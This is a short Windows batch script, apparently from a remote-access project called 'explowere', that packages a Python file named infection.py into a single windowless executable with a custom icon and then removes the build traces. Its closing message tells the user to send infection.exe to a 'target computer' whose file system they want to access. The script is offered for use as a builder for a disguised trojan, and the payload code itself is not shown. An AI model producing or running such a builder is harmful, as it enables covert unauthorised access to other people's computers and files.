echo off
echo Please install python on your system, if already done so
pause
echo This may will take time so please wait...
echo .
pip install -r requirements.txt
PyInstaller --onefile --noconsole --icon=target_icon.ico infection.py
move dist\infection.exe .\
rmdir /s /q build
rmdir /s /q dist
del /q infection.spec

echo .
echo All set, your exe has been created with name infection.exe share it to that target computer device whose file system you want to access, read more about in docs of explowere.
pause
echo on